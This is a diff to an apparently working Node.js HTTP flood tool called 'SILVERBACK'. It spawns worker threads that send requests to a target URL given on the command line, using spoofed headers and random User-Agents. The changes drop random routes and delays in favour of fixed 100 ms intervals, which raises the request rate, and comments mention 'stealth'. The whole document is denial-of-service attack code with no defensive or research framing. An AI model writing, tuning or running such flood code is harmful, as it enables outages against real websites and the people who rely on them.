@@ -10,14 +10,23 @@ let totalRequests = 0;
 let successfulRequests = 0;
 let failedRequests = 0;
 
-// Clear terminal and print header at specific intervals
+// Track the number of active workers to avoid terminal spam
+let workerCount = 0;
+
+// Logging interval (to update without spamming)
+const logInterval = 1000; // Log every second
+
+// Print the stats without overwriting the terminal too frequently
 function logStats() {
-  console.log('SILVERBACK');
-  console.log('==========');
-  console.log(`TOTAL - ${totalRequests}`);
-  console.log(`HIT - ${successfulRequests}`);
-  console.log(`KXX - ${failedRequests}`);
-  console.log('=============================');
+  setInterval(() => {
+    console.clear(); // Clear the terminal screen
+    console.log('SILVERBACK');
+    console.log('==========');
+    console.log(`TOTAL - ${totalRequests}`);
+    console.log(`HIT - ${successfulRequests}`);
+    console.log(`KXX - ${failedRequests}`);
+    console.log('=============================');
+  }, logInterval);
 }
 
 // Generate random User-Agent
@@ -30,13 +39,7 @@ function generateRandomIP() {
   return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
 }
 
-// Define valid routes
-const validRoutes = [
-  '/', '/index.html', '/favicon.ico', '/robots.txt', '/sitemap.xml', 
-  '/about-us', '/contact-us', '/login', '/signup', '/blog'
-];
-
-// Random delay between requests (1 to 3 seconds)
+// Delay function to simulate delay between requests (for stealth)
 function getRandomDelay() {
   return Math.random() * 2000 + 1000; // Random delay between 1-3 seconds
 }
@@ -48,7 +51,7 @@ function getSpoofedHeaders(target) {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate, br',
     'Accept-Language': 'en-US,en;q=0.9',
-    'Referer': target,
+    'Referer': target, // Focused on the main target, no random route
     'Origin': target,
     'Connection': 'keep-alive',
     'Cache-Control': 'no-cache',
@@ -67,36 +70,38 @@ function getSpoofedHeaders(target) {
 // Worker thread function to send requests
 function workerFunction(target) {
   let count = 0;
-  const route = validRoutes[Math.floor(Math.random() * validRoutes.length)];
-  const url = `${target}${route}`;
 
-  // Send requests in a loop (each worker handles a separate instance)
+  // Send requests as fast as possible (without random routes)
   setInterval(async () => {
     try {
+      const url = target; // Use just the main target
       const response = await axios.get(url, {
         headers: getSpoofedHeaders(target),
         timeout: 15000, // Timeout for stealth mode (15 seconds)
         validateStatus: (status) => status >= 200 && status < 400, // Only accept valid status codes
       });
-      
+
       // Successful request (status between 200-299)
       if (response.status >= 200 && response.status < 300) {
         successfulRequests++;
-      } else if (response.status === 404) {
-        // Skip 404 errors (don't count as failed)
-        console.log(`[INFO] Skipped 404 on ${url}`);
       } else {
         failedRequests++;
       }
 
       totalRequests++;
       count++;
+
+      // If we reach a high count, log stats
+      if (count % 100 === 0) {
+        // Log stats periodically without clearing terminal constantly
+        console.log(`[Worker ${workerCount}] Requests sent: ${count}`);
+      }
     } catch (error) {
       failedRequests++;
       totalRequests++;
       console.error(`[Worker] Error: ${error.message}`);
     }
-  }, getRandomDelay());
+  }, 100); // Send requests every 100 ms (10 requests per second, adjust as needed)
 }
 
 // Main process that spawns worker threads
@@ -108,13 +113,14 @@ function startFlood(target, numThreads = 8) {
       process.exit(1);
     }
     
-    // Start logging every 10 seconds
-    setInterval(logStats, 10000); // Log stats every 10 seconds
+    // Start the log stats thread
+    logStats();
 
-    // Pass the target URL to worker threads
+    // Spawn worker threads to handle requests
     for (let i = 0; i < numThreads; i++) {
       const worker = new Worker(__filename);
-      worker.postMessage(target); // Correctly pass the target URL to workers
+      workerCount++;
+      worker.postMessage(target); // Pass the target URL to workers
     }
   } else {
     parentPort.on('message', (target) => {
@@ -125,4 +131,4 @@ function startFlood(target, numThreads = 8) {
 
 // Execute the flood
 const target = process.argv[2];
-startFlood(target, 16); // Start with 16 threads to increase RPS
+startFlood(target, 8);
